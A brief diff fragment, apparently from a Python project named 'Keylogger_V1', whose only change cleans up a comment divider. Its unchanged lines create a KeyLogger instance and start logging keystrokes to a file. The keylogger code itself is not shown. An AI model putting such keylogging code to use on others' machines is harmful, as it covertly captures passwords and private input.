@@ -8,4 +8,4 @@ logger_script = 'Keylogger_V1.py'
 # Create the logger instance and start
 test_keylogger_instance = KeyLogger(file_name)
 test_keylogger_instance.start_log()
-## ----------------------------------------------------------------kjsdkjf--------------------- ##
+## ------------------------------------------------------------------------------------- ##
